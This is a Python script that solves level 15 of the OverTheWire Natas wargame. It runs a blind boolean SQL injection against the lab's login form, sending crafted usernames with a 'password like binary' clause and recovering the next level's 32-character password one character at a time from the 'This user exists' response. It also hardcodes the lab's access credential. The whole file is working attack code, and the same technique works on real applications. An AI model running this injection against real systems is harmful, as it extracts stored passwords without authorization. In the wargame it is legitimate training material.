#! /usr/bin/python3
import requests
import sys
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true"
auth = HTTPBasicAuth("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

all_chars_and_numbers = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
temp_password = ""
password = ""

while True:
    for char in all_chars_and_numbers:
        temp_password = password + char
        query = 'natas16" and password like binary \'{}%\'-- '.format(temp_password)
        response = requests.post(url,data={'username':query},auth=auth)
        soup = BeautifulSoup(response.text,'html.parser')
        output = str(soup.find("div",{"id":"content"}))
        if("This user exists" in output):
            password += char
            sys.stdout.write("\r{}".format(password))
            if(len(password) == 32):
                print("password is: {}".format(password))
                sys.exit(0)
            break
